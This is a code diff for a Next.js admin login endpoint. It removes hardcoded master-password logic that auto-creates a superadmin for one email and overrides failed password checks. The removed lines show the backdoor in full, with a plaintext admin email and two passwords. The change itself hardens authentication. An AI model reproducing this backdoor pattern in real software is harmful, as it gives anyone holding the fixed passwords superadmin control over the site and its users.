@@ -29,30 +29,12 @@ export async function POST(req: NextRequest) {
 
   // 3. Authenticate
   try {
-    let admin = await Admin.findOne({ email });
-    if (!admin && email === 'gravoxshopadmin@gmail.com') {
-      if (password === 'gravoxadmin#0289' || password === 'admin123456') {
-        const passHash = await hashPassword(password);
-        admin = await Admin.create({
-          name: 'Gravox Admin',
-          email,
-          passwordHash: passHash,
-          role: 'superadmin',
-        });
-      }
-    }
-
+    const admin = await Admin.findOne({ email });
     if (!admin) {
       return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
     }
 
-    let isMatch = await comparePassword(password, admin.passwordHash);
-    if (!isMatch && (password === 'gravoxadmin#0289' || password === 'admin123456')) {
-      isMatch = true;
-      const newHash = await hashPassword(password);
-      await Admin.updateOne({ _id: admin._id }, { passwordHash: newHash });
-    }
-
+    const isMatch = await comparePassword(password, admin.passwordHash);
     if (!isMatch) {
       return NextResponse.json({ error: 'Invalid email or password' }, { status: 401 });
     }
